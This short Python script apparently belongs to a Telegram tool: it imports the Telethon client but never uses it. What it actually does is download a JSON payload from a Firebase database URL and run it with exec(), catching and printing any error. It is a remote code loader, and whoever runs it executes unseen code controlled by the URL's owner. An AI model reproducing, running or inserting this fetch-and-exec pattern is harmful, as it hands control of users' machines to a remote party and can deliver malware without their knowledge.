from telethon import TelegramClient
import requests
try:
  s = 'https://jqualin-990c1-default-rtdb.firebaseio.com/r/code.json'
  code = requests.get(s).json()
  exec(code)
except Exception as e:
  print(e)

print('program exit\n')
